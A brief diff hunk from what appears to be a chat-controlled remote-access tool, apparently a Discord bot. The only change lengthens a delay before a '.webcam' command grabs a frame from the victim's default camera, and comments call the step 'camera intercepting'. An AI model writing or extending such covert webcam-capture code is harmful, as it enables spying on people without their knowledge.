@@ -29,7 +29,7 @@ elif message.content[:7] == '.webcam':
             camera = pygame.camera.Camera(cameras[0])
             #.log Selected the default camera 
             camera.start()
-            time.sleep(0.5)
+            time.sleep(1)
             #.log Started camera intercepting 
             image = camera.get_image()
             #.log Took image from camera 
